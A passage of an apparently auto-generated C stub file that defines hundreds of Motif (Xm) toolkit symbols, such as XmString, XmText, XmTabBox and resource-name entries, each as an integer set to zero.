_XmSCXmStringTable = 0;\nint _XmSdarkThreshold = 0;\nint _XmSdecimalPoints = 0;\nint _XmSdecrementCallback = 0;\nint _XmSdefaultActionCallback = 0;\nint _XmSDEFAULT_BACKGROUND = 0;\nint _XmSdefaultButton = 0;\nint _XmSdefaultButtonShadowThickness = 0;\nint _XmSdefaultButtonType = 0;\nint _XmSdefaultCopyCursorIcon = 0;\nint _XmSDEFAULT_FONT = 0;\nint _XmSdefaultFontList = 0;\nint _XmSdefaultInvalidCursorIcon = 0;\nint _XmSdefaultLinkCursorIcon = 0;\nint _XmSdefaultMoveCursorIcon = 0;\nint _XmSdefaultNoneCursorIcon = 0;\nint _XmSdefaultPosition = 0;\nint _XmSdefaultSourceCursorIcon = 0;\nint _XmSdefaultValidCursorIcon = 0;\nint _XmSdeleteResponse = 0;\nint _XmSdesktopParent = 0;\nint _XmSdialogStyle = 0;\nint _XmSdialogTitle = 0;\nint _XmSdialogType = 0;\nint _XmSdirectory = 0;\nint _XmSdirectoryValid = 0;\nint _XmSdirListItemCount = 0;\nint _XmSdirListItems = 0;\nint _XmSdirListLabelString = 0;\nint _XmSdirMask = 0;\nint _XmSdirSearchProc = 0;\nint _XmSdirSpec = 0;\nint _XmSdisarmCallback = 0;\nint _XmSdoubleClickInterval = 0;\nint _XmSdoubleSeparator = 0;\nint _XmSdragCallback = 0;\nint _XmSdragContextClass = 0;\nint _XmSdragDropFinishCallback = 0;\nint _XmSdragIconClass = 0;\nint _XmSdragInitiatorProtocolStyle = 0;\nint _XmSdragMotionCallback = 0;\nint _XmSdragOperations = 0;\nint _XmSdragOverMode = 0;\nint _XmSdragProc = 0;\nint _XmSdragReceiverProtocolStyle = 0;\nint _XmSdropFinishCallback = 0;\nint _XmSdropProc = 0;\nint _XmSdropRectangles = 0;\nint _XmSdropSiteActivity = 0;\nint _XmSdropSiteEnterCallback = 0;\nint _XmSdropSiteLeaveCallback = 0;\nint _XmSdropSiteManagerClass = 0;\nint _XmSdropSiteOperations = 0;\nint _XmSdropSiteType = 0;\nint _XmSdropStartCallback = 0;\nint _XmSdropTransferClass = 0;\nint _XmSdropTransfers = 0;\nint _XmSearchColorCache = 0;\nint _XmSecondaryResourceData = 0;\nint _XmSeditable = 0;\nint _XmSeditMode = 0;\nint _XmSelectColorDefault = 0;\nint _XmSelectioB_defaultTextAccelerators = 0;\nint xmSelectionBoxClassRec = 0;\nint _XmSelectionBoxCreateApplyButton = 0;\nint _XmSelectionBoxCreateCancelButton = 0;\nint _XmSelectionBoxCreateHelpButton = 0;\nint _XmSelectionBoxCreateList = 0;\nint _XmSelectionBoxCreateListLabel = 0;\nint _XmSelectionBoxCreateOkButton = 0;\nint _XmSelectionBoxCreateSelectionLabel = 0;\nint _XmSelectionBoxCreateSeparator = 0;\nint _XmSelectionBoxCreateText = 0;\nint _XmSelectionBoxGeoMatrixCreate = 0;\nint _XmSelectionBoxGetApplyLabelString = 0;\nint _XmSelectionBoxGetCancelLabelString = 0;\nint XmSelectionBoxGetChild = 0;\nint _XmSelectionBoxGetHelpLabelString = 0;\nint _XmSelectionBoxGetListItemCount = 0;\nint _XmSelectionBoxGetListItems = 0;\nint _XmSelectionBoxGetListLabelString = 0;\nint _XmSelectionBoxGetListVisibleItemCount = 0;\nint _XmSelectionBoxGetOkLabelString = 0;\nint _XmSelectionBoxGetSelectionLabelString = 0;\nint _XmSelectionBoxGetTextColumns = 0;\nint _XmSelectionBoxGetTextString = 0;\nint _XmSelectionBoxNoGeoRequest = 0;\nint _XmSelectionBoxRestore = 0;\nint _XmSelectionBoxUpOrDown = 0;\nint xmSelectionBoxWidgetClass = 0;\nint _XmSEMPTY_STRING = 0;\nint _XmSendICCCallback = 0;\nint _XmSentryAlignment = 0;\nint _XmSentryBorder = 0;\nint _XmSentryCallback = 0;\nint _XmSentryClass = 0;\nint _XmSentryVerticalAlignment = 0;\nint _XmSeparatorCacheCompare = 0;\nint xmSeparatorClassRec = 0;\nint _XmSeparatorFix = 0;\nint xmSeparatorGadgetClass = 0;\nint xmSeparatorGadgetClassRec = 0;\nint xmSeparatorGCacheObjClassRec = 0;\nint xmSeparatorWidgetClass = 0;\nint _XmSetActiveTabGroup = 0;\nint _XmSetActualClass = 0;\nint XmSetColorCalculation = 0;\nint _XmSetDefaultBackgroundColorSpec = 0;\nint _XmSetDestination = 0;\nint _XmSetDragReceiverInfo = 0;\nint _XmSetEtchedSlider = 0;\nint _XmSetFocusFlag = 0;\nint _XmSetFocusResetFlag = 0;\nint XmSetFontUnit = 0;\nint XmSetFontUnits = 0;\nint _XmSetInDragMode = 0;\nint _XmSetInitialOfTabGraph = 0;\nint _XmSetInitialOfTabGroup = 0;\nint _XmSetKidGeo = 0;\nint _XmSetLastManagedMenuTime = 0;\nint XmSetMenuCursor = 0;\nint _XmSetMenuTraversal = 0;\nint _XmSetPopupMenuClick = 0;\nint XmSetProtocolHooks = 0;\nint _XmSetRect = 0;\nint _XmSetSwallowEventHandler = 0;\nint _XmSetThickness = 0;\nint _XmSetThicknessDefault0 = 0;\nint XmSetToolTipString = 0;\nint _XmSetTransientFlag = 0;\nint _XmSetValuesOnChildren = 0;\nint _XmSetXmDisplayClass = 0;\nint _XmSexportTargets = 0;\nint _XmSexposeCallback = 0;\nint _XmSextendedSelectionCallback = 0;\nint _XmSextensionType = 0;\nint _XmSFAddNavigator = 0;\nint _XmSfileListItemCount = 0;\nint _XmSfileListItems = 0;\nint _XmSfileListLabelString = 0;\nint _XmSfileSearchProc = 0;\nint _XmSfileTypeMask = 0;\nint _XmSfillOnArm = 0;\nint _XmSfillOnSelect = 0;\nint _XmSfilterLabelString = 0;\nint _XmSfocusCallback = 0;\nint _XmSfocusMovedCallback = 0;\nint _XmSfocusPolicyChanged = 0;\nint _XmSfontList = 0;\nint _XmSforegroundThreshold = 0;\nint _XmSfractionBase = 0;\nint _XmSFRemoveNavigator = 0;\nint _XmSFUpdateNavigatorsValue = 0;\nint _XmSgainPrimaryCallback = 0;\nint xmShellExtClassRec = 0;\nint xmShellExtObjectClass = 0;\nint _XmShellIsExclusive = 0;\nint _XmShelpCallback = 0;\nint _XmShelpLabelString = 0;\nint _XmShighlightColor = 0;\nint _XmShighlightOnEnter = 0;\nint _XmShighlightPixmap = 0;\nint _XmShighlightThickness = 0;\nint _XmShistoryItemCount = 0;\nint _XmShistoryItems = 0;\nint _XmShistoryMaxItems = 0;\nint _XmShistoryVisibleItemCount = 0;\nint _XmShorizontalFontUnit = 0;\nint _XmShorizontalScrollBar = 0;\nint _XmShorizontalSpacing = 0;\nint _XmShotX = 0;\nint _XmShotY = 0;\nint _XmSiccHandle = 0;\nint XmSimpleSpinBoxAddItem = 0;\nint xmSimpleSpinBoxClassRec = 0;\nint XmSimpleSpinBoxDeletePos = 0;\nint XmSimpleSpinBoxSetItem = 0;\nint xmSimpleSpinBoxWidgetClass = 0;\nint _XmSimportTargets = 0;\nint _XmSincrement = 0;\nint _XmSincremental = 0;\nint _XmSincrementCallback = 0;\nint _XmSindicatorOn = 0;\nint _XmSindicatorSize = 0;\nint _XmSindicatorType = 0;\nint _XmSinitialDelay = 0;\nint _XmSinitialFocus = 0;\nint _XmSinputCallback = 0;\nint _XmSinputCreate = 0;\nint _XmSinputMethod = 0;\nint _XmSinvalidCursorForeground = 0;\nint _XmSisAligned = 0;\nint _XmSisHomogeneous = 0;\nint _XmSitemCount = 0;\nint _XmSitems = 0;\nint _XmSkeyboardFocusPolicy = 0;\nint _XmSlabelFontList = 0;\nint _XmSlabelInsensitivePixmap = 0;\nint _XmSlabelPixmap = 0;\nint _XmSlabelString = 0;\nint _XmSlabelType = 0;\nint _XmSleep = 0;\nint _XmSleftAttachment = 0;\nint _XmSleftOffset = 0;\nint _XmSleftPosition = 0;\nint _XmSleftWidget = 0;\nint xmSlideContextClassRec = 0;\nint xmSlideContextWidgetClass = 0;\nint _XmSlightThreshold = 0;\nint _XmSlistItemCount = 0;\nint _XmSlistItems = 0;\nint _XmSlistLabelString = 0;\nint _XmSlistMarginHeight = 0;\nint _XmSlistMarginWidth = 0;\nint _XmSlistSizePolicy = 0;\nint _XmSlistSpacing = 0;\nint _XmSlistUpdated = 0;\nint _XmSlistVisibleItemCount = 0;\nint _XmSlogicalParent = 0;\nint _XmSlosePrimaryCallback = 0;\nint _XmSlosingFocusCallback = 0;\nint _XmSmainWindowMarginHeight = 0;\nint _XmSmainWindowMarginWidth = 0;\nint _XmSmapCallback = 0;\nint _XmSmappingDelay = 0;\nint _XmSmargin = 0;\nint _XmSmarginBottom = 0;\nint _XmSmarginHeight = 0;\nint _XmSmarginLeft = 0;\nint _XmSmarginRight = 0;\nint _XmSmarginTop = 0;\nint _XmSmarginWidth = 0;\nint _XmSmask = 0;\nint _XmSmaximum = 0;\nint _XmSmaxLength = 0;\nint _XmSmenuAccelerator = 0;\nint _XmSmenuBar = 0;\nint _XmSmenuCursor = 0;\nint _XmSmenuHelpWidget = 0;\nint _XmSmenuHistory = 0;\nint _XmSmenuPost = 0;\nint _XmSmessageAlignment = 0;\nint _XmSmessageProc = 0;\nint _XmSmessageString = 0;\nint _XmSmessageWindow = 0;\nint _XmSminimizeButtons = 0;\nint _XmSminimum = 0;\nint _XmSmnemonic = 0;\nint _XmSmnemonicCharSet = 0;\nint _XmSmodifyVerifyCallback = 0;\nint _XmSmodifyVerifyCallbackWcs = 0;\nint _XmSmotionVerifyCallback = 0;\nint _XmSmoveOpaque = 0;\nint _XmSmultiClick = 0;\nint _XmSmultipleSelectionCallback = 0;\nint _XmSmustMatch = 0;\nint _XmSmwmDecorations = 0;\nint _XmSmwmFunctions = 0;\nint _XmSmwmInputMode = 0;\nint _XmSmwmMenu = 0;\nint _XmSmwmMessages = 0;\nint _XmSnavigationType = 0;\nint _XmSneedsMotion = 0;\nint _XmSnoMatchCallback = 0;\nint _XmSnoMatchString = 0;\nint _XmSnoneCursorForeground = 0;\nint _XmSnoResize = 0;\nint _XmSnotifyProc = 0;\nint _XmSnumColumns = 0;\nint _XmSnumDropRectangles = 0;\nint _XmSnumDropTransfers = 0;\nint _XmSnumExportTargets = 0;\nint _XmSnumImportTargets = 0;\nint _XmSnumRectangles = 0;\nint _XmSocorro = 0;\nint _XmSoffsetX = 0;\nint _XmSoffsetY = 0;\nint _XmSokCallback = 0;\nint _XmSokLabelString = 0;\nint _XmSoperationChangedCallback = 0;\nint _XmSoperationCursorIcon = 0;\nint _XmSoptionLabel = 0;\nint _XmSoptionMnemonic = 0;\nint _XmSortResourceList = 0;\nint _XmSosfActivate = 0;\nint _XmSosfAddMode = 0;\nint _XmSosfBackSpace = 0;\nint _XmSosfBeginLine = 0;\nint _XmSosfCancel = 0;\nint _XmSosfClear = 0;\nint _XmSosfCopy = 0;\nint _XmSosfCut = 0;\nint _XmSosfDelete = 0;\nint _XmSosfDown = 0;\nint _XmSosfEndLine = 0;\nint _XmSosfHelp = 0;\nint _XmSosfInsert = 0;\nint _XmSosfLeft = 0;\nint _XmSosfMenu = 0;\nint _XmSosfMenuBar = 0;\nint _XmSosfPageDown = 0;\nint _XmSosfPageLeft = 0;\nint _XmSosfPageRight = 0;\nint _XmSosfPageUp = 0;\nint _XmSosfPaste = 0;\nint _XmSosfPrimaryPaste = 0;\nint _XmSosfQuickPaste = 0;\nint _XmSosfRight = 0;\nint _XmSosfSelect = 0;\nint _XmSosfUndo = 0;\nint _XmSosfUp = 0;\nint _XmSoutputCreate = 0;\nint _XmSpacking = 0;\nint _XmSpageDecrementCallback = 0;\nint _XmSpageIncrement = 0;\nint _XmSpageIncrementCallback = 0;\nint _XmSpaneMaximum = 0;\nint _XmSpaneMinimum = 0;\nint _XmSpattern = 0;\nint _XmSpendingDelete = 0;\nint _XmSpinB_defaultAccelerators = 0;\nint _XmSpinB_defaultTranslations = 0;\nint xmSpinBoxClassRec = 0;\nint XmSpinBoxValidatePosition = 0;\nint xmSpinBoxWidgetClass = 0;\nint _XmSpopupEnabled = 0;\nint _XmSpositionIndex = 0;\nint _XmSpostFromButton = 0;\nint _XmSpostFromCount = 0;\nint _XmSpostFromList = 0;\nint _XmSpreeditType = 0;\nint _XmSprocessingDirection = 0;\nint _XmSpromptString = 0;\nint _XmSprotocolCallback = 0;\nint _XmSpushButton = 0;\nint _XmSpushButtonEnabled = 0;\nint _XmSqualifySearchDataProc = 0;\nint _XmSradioAlwaysOne = 0;\nint _XmSradioBehavior = 0;\nint _XmSradioButton = 0;\nint _XmSrealizeCallback = 0;\nint _XmSrecomputeSize = 0;\nint _XmSrectangles = 0;\nint _XmSrefigureMode = 0;\nint _XmSrepeatDelay = 0;\nint _XmSresizable = 0;\nint _XmSresizeCallback = 0;\nint _XmSresizeHeight = 0;\nint _XmSresizePolicy = 0;\nint _XmSresizeWidth = 0;\nint _XmSrightAttachment = 0;\nint _XmSrightOffset = 0;\nint _XmSrightPosition = 0;\nint _XmSrightWidget = 0;\nint _XmSrowColumnType = 0;\nint _XmSrows = 0;\nint _XmSrubberPositioning = 0;\nint _XmSsashHeight = 0;\nint _XmSsashIndent = 0;\nint _XmSsashShadowThickness = 0;\nint _XmSsashWidth = 0;\nint _XmSscaleHeight = 0;\nint _XmSscaleMultiple = 0;\nint _XmSscaleWidth = 0;\nint _XmSscrollBarDisplayPolicy = 0;\nint _XmSscrollBarPlacement = 0;\nint _XmSscrolledWindowMarginHeight = 0;\nint _XmSscrolledWindowMarginWidth = 0;\nint _XmSscrollHorizontal = 0;\nint _XmSscrollingPolicy = 0;\nint _XmSscrollLeftSide = 0;\nint _XmSscrollTopSide = 0;\nint _XmSscrollVertical = 0;\nint _XmSselectColor = 0;\nint _XmSselectedItemCount = 0;\nint _XmSselectedItems = 0;\nint _XmSselectInsensitivePixmap = 0;\nint _XmSselectionArrayCount = 0;\nint _XmSselectionLabelString = 0;\nint _XmSselectionPolicy = 0;\nint _XmSselectPixmap = 0;\nint _XmSselectThreshold = 0;\nint _XmSseparator = 0;\nint _XmSseparatorOn = 0;\nint _XmSseparatorType = 0;\nint _XmSset = 0;\nint _XmSshadow = 0;\nint _XmSshadowThickness = 0;\nint _XmSshadowType = 0;\nint _XmSshellUnitType = 0;\nint _XmSshowArrows = 0;\nint _XmSshowAsDefault = 0;\nint _XmSshowSeparator = 0;\nint _XmSshowValue = 0;\nint _XmSsimpleCallback = 0;\nint _XmSsingleSelectionCallback = 0;\nint _XmSsingleSeparator = 0;\nint _XmSsizePolicy = 0;\nint _XmSskipAdjust = 0;\nint _XmSsliderSize = 0;\nint _XmSsource = 0;\nint _XmSsourceCursorIcon = 0;\nint _XmSsourceIsExternal = 0;\nint _XmSsourcePixmapIcon = 0;\nint _XmSsourceWidget = 0;\nint _XmSsourceWindow = 0;\nint _XmSspacing = 0;\nint _XmSstartTime = 0;\nint _XmSstateCursorIcon = 0;\nint _XmSstringDirection = 0;\nint _XmSsubMenuId = 0;\nint _XmSsymbolPixmap = 0;\nint _XmStackFree = 0;\nint _XmStackInit = 0;\nint _XmStackPop = 0;\nint _XmStackPush = 0;\nint xm_std_constraint_filter = 0;\nint xm_std_filter = 0;\nint _XmStearOffMenuActivateCallback = 0;\nint _XmStearOffMenuDeactivateCallback = 0;\nint _XmStearOffModel = 0;\nint _XmStextAccelerators = 0;\nint _XmStextColumns = 0;\nint _XmStextFontList = 0;\nint _XmStextString = 0;\nint _XmStextTranslations = 0;\nint _XmStextValue = 0;\nint _XmStitleString = 0;\nint _XmStoBottomCallback = 0;\nint _XmStopAttachment = 0;\nint _XmStopCharacter = 0;\nint _XmStopItemPosition = 0;\nint _XmStopLevelEnterCallback = 0;\nint _XmStopLevelLeaveCallback = 0;\nint _XmStopOffset = 0;\nint _XmStoPositionCallback = 0;\nint _XmStopPosition = 0;\nint _XmStopShadowColor = 0;\nint _XmStopShadowPixmap = 0;\nint _XmStopWidget = 0;\nint _XmStoTopCallback = 0;\nint _XmStransferProc = 0;\nint _XmStransferStatus = 0;\nint _XmStraversalCallback = 0;\nint _XmStraversalOn = 0;\nint _XmStraversalType = 0;\nint _XmStraverseObscuredCallback = 0;\nint _XmStreeUpdateProc = 0;\nint _XmStringBaseline = 0;\nint XmStringBaseline = 0;\nint _XmStringByteCompare = 0;\nint XmStringByteCompare = 0;\nint XmStringByteStreamLength = 0;\nint _XmStringCacheFree = 0;\nint _XmStringCacheGet = 0;\nint _XmStringCacheTag = 0;\nint _XmStringCharacterCount = 0;\nint XmStringCompare = 0;\nint XmStringComponentCreate = 0;\nint XmStringConcat = 0;\nint XmStringConcatAndFree = 0;\nint _XmStringContextCopy = 0;\nint _XmStringContextFree = 0;\nint _XmStringContextReInit = 0;\nint _XmStringCopy = 0;\nint XmStringCopy = 0;\nint _XmStringCreate = 0;\nint XmStringCreate = 0;\nint _XmStringCreateExternal = 0;\nint XmStringCreateFontList = 0;\nint XmStringCreateFontList_r = 0;\nint XmStringCreateLocalized = 0;\nint XmStringCreateLtoR = 0;\nint XmStringCreateSimple = 0;\nint XmStringDirectionCreate = 0;\nint XmStringDirectionToDirection = 0;\nint _XmStringDraw = 0;\nint XmStringDraw = 0;\nint _XmStringDrawImage = 0;\nint XmStringDrawImage = 0;\nint _XmStringDrawLining = 0;\nint _XmStringDrawMnemonic = 0;\nint _XmStringDrawSegment = 0;\nint _XmStringDrawUnderline = 0;\nint XmStringDrawUnderline = 0;\nint _XmStringEmpty = 0;\nint XmStringEmpty = 0;\nint _XmStringEntryCopy = 0;\nint _XmStringEntryFree = 0;\nint _XmStringExtent = 0;\nint XmStringExtent = 0;\nint _XmStringFree = 0;\nint XmStringFree = 0;\nint _XmStringFreeContext = 0;\nint XmStringFreeContext = 0;\nint XmStringGenerate = 0;\nint _XmStringGetBaselines = 0;\nint _XmStringGetCurrentCharset = 0;\nint XmStringGetLtoR = 0;\nint XmStringGetNextComponent = 0;\nint _XmStringGetNextSegment = 0;\nint XmStringGetNextSegment = 0;\nint _XmStringGetNextTabWidth = 0;\nint XmStringGetNextTriple = 0;\nint _XmStringGetSegment = 0;\nint _XmStringGetTextConcat = 0;\nint _XmStringHasSubstring = 0;\nint XmStringHasSubstring = 0;\nint _XmStringHeight = 0;\nint XmStringHeight = 0;\nint _XmStringIndexCacheTag = 0;\nint _XmStringIndexGetTag = 0;\nint _XmStringInitContext = 0;\nint XmStringInitContext = 0;\nint _XmStringIsCurrentCharset = 0;\nint XmStringIsVoid = 0;\nint _XmStringIsXmString = 0;\nint _XmStringLayout = 0;\nint XmStringLength = 0;\nint _XmStringLineCount = 0;\nint XmStringLineCount = 0;\nint XmStringLtoRCreate = 0;\nint XmStringNConcat = 0;\nint XmStringNCopy = 0;\nint _XmStringNCreate = 0;\nint _XmStringOptToNonOpt = 0;\nint XmStringParseText = 0;\nint XmStringPeekNextComponent = 0;\nint XmStringPeekNextTriple = 0;\nint XmStringPutRendition = 0;\nint _XmStringRender = 0;\nint _XmStrings = 0;\nint _XmStrings22 = 0;\nint _XmStrings23 = 0;\nint _XmStringsAreEqual = 0;\nint XmStringSegmentCreate = 0;\nint _XmStringSegmentExtents = 0;\nint _XmStringSegmentNew = 0;\nint XmStringSeparatorCreate = 0;\nint _XmStringsI = 0;\nint _XmStringSingleSegment = 0;\nint _XmStringSourceCreate = 0;\nint _XmStringSourceDestroy = 0;\nint _XmStringSourceFindString = 0;\nint _XmStringSourceGetEditable = 0;\nint _XmStringSourceGetMaxLength = 0;\nint _XmStringSourceGetPending = 0;\nint _XmStringSourceGetString = 0;\nint _XmStringSourceGetValue = 0;\nint _XmStringSourceHasSelection = 0;\nint _XmStringSourceSetEditable = 0;\nint _XmStringSourceSetGappedBuffer = 0;\nint _XmStringSourceSetMaxLength = 0;\nint _XmStringSourceSetPending = 0;\nint _XmStringSourceSetValue = 0;\nint XmStringTableParseStringArray = 0;\nint XmStringTableProposeTablist = 0;\nint XmStringTableToXmString = 0;\nint XmStringTableUnparse = 0;\nint XmStringToXmStringTable = 0;\nint _XmStringTruncateASN1 = 0;\nint _XmStringUngenerate = 0;\nint XmStringUnparse = 0;\nint _XmStringUpdate = 0;\nint _XmStringUpdateWMShellTitle = 0;\nint _XmStringWidth = 0;\nint XmStringWidth = 0;\nint _XmStroughColor = 0;\nint _XmSunitType = 0;\nint _XmSunmapCallback = 0;\nint _XmSunpostBehavior = 0;\nint _XmSunselectPixmap = 0;\nint _XmSupdateSliderSize = 0;\nint _XmSuseAsyncGeometry = 0;\nint _XmSuserData = 0;\nint _XmSvalidCursorForeground = 0;\nint _XmSvalueChangedCallback = 0;\nint _XmSvalueWcs = 0;\nint _XmSverifyBell = 0;\nint _XmSverticalFontUnit = 0;\nint _XmSverticalScrollBar = 0;\nint _XmSverticalSpacing = 0;\nint _XmSvisibleItemCount = 0;\nint _XmSvisibleWhenOff = 0;\nint _XmSvisualPolicy = 0;\nint _XmSWGetClipArea = 0;\nint _XmSwhichButton = 0;\nint _XmSWNotifyGeoChange = 0;\nint _XmSwordWrap = 0;\nint _XmSworkWindow = 0;\nint _XmSyncDropSiteTree = 0;\nint XmTabAttributesFree = 0;\nint XmTabbedStackListAppend = 0;\nint _XmTabbedStackListArray = 0;\nint XmTabbedStackListCompare = 0;\nint XmTabbedStackListCopy = 0;\nint _XmTabbedStackListCount = 0;\nint XmTabbedStackListCreate = 0;\nint XmTabbedStackListFind = 0;\nint XmTabbedStackListFree = 0;\nint _XmTabbedStackListGet = 0;\nint XmTabbedStackListInsert = 0;\nint XmTabbedStackListModify = 0;\nint XmTabbedStackListQuery = 0;\nint XmTabbedStackListRemove = 0;\nint XmTabbedStackListSimpleAppend = 0;\nint XmTabbedStackListSimpleInsert = 0;\nint XmTabbedStackListSimpleModify = 0;\nint XmTabbedStackListSimpleQuery = 0;\nint XmTabbedStackListSimpleRemove = 0;\nint _XmTabBoxCanvas = 0;\nint xmTabBoxClassRec = 0;\nint XmTabBoxGetIndex = 0;\nint _XmTabBoxGetMaxTabHeight = 0;\nint _XmTabBoxGetMaxTabWidth = 0;\nint XmTabBoxGetNumColumns = 0;\nint XmTabBoxGetNumRows = 0;\nint _XmTabBoxGetNumRowsColumns = 0;\nint XmTabBoxGetNumTabs = 0;\nint _XmTabBoxGetTabHeight = 0;\nint XmTabBoxGetTabRow = 0;\nint _XmTabBoxGetTabWidth = 0;\nint _XmTabBoxSelectTab = 0;\nint _XmTabBoxStackedGeometry = 0;\nint xmTabBoxWidgetClass = 0;\nint XmTabBoxXYToIndex = 0;\nint xmTabCanvasClassRec = 0;\nint xmTabCanvasWidgetClass = 0;\nint _XmTabCopy = 0;\nint XmTabCreate = 0;\nint XmTabFree = 0;\nint XmTabGetValues = 0;\nint _XmTabListAdd = 0;\nint XmTabListCopy = 0;\nint _XmTabListDelete = 0;\nint XmTabListFree = 0;\nint _XmTabListGetPosition = 0;\nint XmTabListGetTab = 0;\nint XmTabListInsertTabs = 0;\nint XmTabListRemoveTabs = 0;\nint XmTabListReplacePositions = 0;\nint XmTabListTabCount = 0;\nint XmTabSetValue = 0;\nint xmTabStackClassRec = 0;\nint XmTabStackGetSelectedTab = 0;\nint XmTabStackIndexToWidget = 0;\nint XmTabStackSelectTab = 0;\nint xmTabStackWidgetClass = 0;\nint XmTargetsAreCompatible = 0;\nint _XmTargetsToIndex = 0;\nint _XmTearOffB_overrideTranslations = 0;\nint _XmTearOffBPrimClassExtRec = 0;\nint _XmTearOffBtnDownEventHandler = 0;\nint _XmTearOffBtnUpEventHandler = 0;\nint xmTearOffButtonClassRec = 0;\nint xmTearOffButtonWidgetClass = 0;\nint _XmTearOffInitiate = 0;\nint _XmTestTraversability = 0;\nint _XmTextAdjustGC = 0;\nint _XmTextBytesToCharacters = 0;\nint _XmTextChangeBlinkBehavior = 0;\nint _XmTextChangeHOffset = 0;\nint _XmTextChangeVOffset = 0;\nint _XmTextCharactersToBytes = 0;\nint xmTextClassRec = 0;\nint _XmTextClearDestination = 0;\nint XmTextClearSelection = 0;\nint _XmTextConvert = 0;\nint XmTextCopy = 0;\nint XmTextCopyLink = 0;\nint _XmTextCountCharacters = 0;\nint XmTextCut = 0;\nint _XmTextDestinationVisible = 0;\nint _XmTextDisableRedisplay = 0;\nint XmTextDisableRedisplay = 0;\nint _XmTextDrawDestination = 0;\nint _XmTextEnableRedisplay = 0;\nint XmTextEnableRedisplay = 0;\nint _XmTextEventBindings1 = 0;\nint _XmTextEventBindings2 = 0;\nint _XmTextEventBindings3 = 0;\nint _XmTextF_EventBindings1 = 0;\nint _XmTextF_EventBindings2 = 0;\nint _XmTextF_EventBindings3 = 0;\nint xmTextFieldClassRec = 0;\nint XmTextFieldClearSelection = 0;\nint _XmTextFieldConvert = 0;\nint XmTextFieldCopy = 0;\nint XmTextFieldCopyLink = 0;\nint _XmTextFieldCountBytes = 0;\nint _XmTextFieldCountCharacters = 0;\nint XmTextFieldCut = 0;\nint _XmTextFieldDeselectSelection = 0;\nint _XmTextFieldDestinationVisible = 0;\nint _XmTextFieldDrawInsertionPoint = 0;\nint XmTextFieldGetAddMode = 0;\nint XmTextFieldGetBaseline = 0;\nint XmTextFieldGetBaseLine = 0;\nint XmTextFieldGetCursorPosition = 0;\nint _XmTextFieldGetDropReciever = 0;\nint XmTextFieldGetEditable = 0;\nint XmTextFieldGetInsertionPosition = 0;\nint XmTextFieldGetLastPosition = 0;\nint XmTextFieldGetMaxLength = 0;\nint XmTextFieldGetSelection = 0;\nint XmTextFieldGetSelectionPosition = 0;\nint XmTextFieldGetSelectionWcs = 0;\nint XmTextFieldGetString = 0;\nint XmTextFieldGetStringWcs = 0;\nint XmTextFieldGetSubstring = 0;\nint XmTextFieldGetSubstringWcs = 0;\nint _XmTextFieldHandleSecondaryFinished = 0;\nint XmTextFieldInsert = 0;\nint XmTextFieldInsertWcs = 0;\nint _XmTextFieldInstallTransferTrait = 0;\nint _XmTextFieldLoseSelection = 0;\nint XmTextFieldPaste = 0;\nint XmTextFieldPasteLink = 0;\nint XmTextFieldPosToXY = 0;\nint XmTextFieldRemove = 0;\nint XmTextFieldReplace = 0;\nint _XmTextFieldReplaceText = 0;\nint XmTextFieldReplaceWcs = 0;\nint XmTextFieldSetAddMode = 0;\nint _XmTextFieldSetClipRect = 0;\nint _XmTextFieldSetCursorPosition = 0;\nint XmTextFieldSetCursorPosition = 0;\nint _XmTextFieldSetDestination = 0;\nint XmTextFieldSetEditable = 0;\nint XmTextFieldSetHighlight = 0;\nint XmTextFieldSetInsertionPosition = 0;\nint XmTextFieldSetMaxLength = 0;\nint _XmTextFieldSetSel2 = 0;\nint XmTextFieldSetSelection = 0;\nint XmTextFieldSetString = 0;\nint XmTextFieldSetStringWcs = 0;\nint XmTextFieldShowPosition = 0;\nint _XmTextFieldStartSelection = 0;\nint xmTextFieldWidgetClass = 0;\nint XmTextFieldXYToPos = 0;\nint _XmTextFindLineEnd = 0;\nint _XmTextFindScroll = 0;\nint XmTextFindString = 0;\nint _XmTextFindStringBackwards = 0;\nint _XmTextFindStringForwards = 0;\nint XmTextFindStringWcs = 0;\nint _XmTextFPrimClassExtRec = 0;\nint _XmTextFreeContextData = 0;\nint _XmTextFToggleCursorGC = 0;\nint XmTextGetAddMode = 0;\nint _XmTextGetAnchor = 0;\nint XmTextGetBaseline = 0;\nint _XmTextGetBaseLine = 0;\nint XmTextGetBaseLine = 0;\nint _XmTextGetBaselines = 0;\nint XmTextGetCenterline = 0;\nint XmTextGetCursorPosition = 0;\nint _XmTextGetDisplayRect = 0;\nint _XmTextGetDropReciever = 0;\nint XmTextGetEditable = 0;\nint XmTextGetInsertionPosition = 0;\nint XmTextGetLastPosition = 0;\nint _XmTextGetLineTable = 0;\nint XmTextGetMaxLength = 0;\nint _XmTextGetNumberLines = 0;\nint _XmTextGetSel2 = 0;\nint XmTextGetSelection = 0;\nint XmTextGetSelectionPosition = 0;\nint XmTextGetSelectionWcs = 0;\nint XmTextGetSource = 0;\nint XmTextGetString = 0;\nint XmTextGetStringWcs = 0;\nint XmTextGetSubstring = 0;\nint XmTextGetSubstringWcs = 0;\nint _XmTextGetTableIndex = 0;\nint XmTextGetTopCharacter = 0;\nint _XmTextGetTotalLines = 0;\nint _XmTextHandleSecondaryFinished = 0;\nint _XmTextHasDestination = 0;\nint _XmTextInputCreate = 0;\nint _XmTextInputGetSecResData = 0;\nint XmTextInsert = 0;\nint XmTextInsertWcs = 0;\nint _XmTextInstallTransferTrait = 0;\nint _XmTextInvalidate = 0;\nint _XmTextIn_XmTextEventBindings1 = 0;\nint _XmTextIn_XmTextEventBindings2 = 0;\nint _XmTextIn_XmTextEventBindings3 = 0;\nint _XmTextIn_XmTextVEventBindings = 0;\nint _XmTextLineInfo = 0;\nint _XmTextLoseSelection = 0;\nint _XmTextMarginsProc = 0;\nint _XmTextMarkRedraw = 0;\nint _XmTextModifyVerify = 0;\nint _XmTextMovingCursorPosition = 0;\nint _XmTextNeedsPendingDeleteDis = 0;\nint _XmTextNumLines = 0;\nint _XmTextOutLoadGCsAndRecolorCursors = 0;\nint _XmTextOutputCreate = 0;\nint _XmTextOutputGetSecResData = 0;\nint XmTextPaste = 0;\nint XmTextPasteLink = 0;\nint _XmTextPosToLine = 0;\nint XmTextPosToXY = 0;\nint _XmTextPrimClassExtRec = 0;\nint _XmTextRealignLineTable = 0;\nint XmTextRemove = 0;\nint _XmTextReplace = 0;\nint XmTextReplace = 0;\nint XmTextReplaceWcs = 0;\nint _XmTextResetClipOrigin = 0;\nint _XmTextResetIC = 0;\nint XmTextScroll = 0;\nint _XmTextScrollable = 0;\nint XmTextSetAddMode = 0;\nint _XmTextSetCursorPosition = 0;\nint XmTextSetCursorPosition = 0;\nint _XmTextSetDestinationSelection = 0;\nint _XmTextSetEditable = 0;\nint XmTextSetEditable = 0;\nint 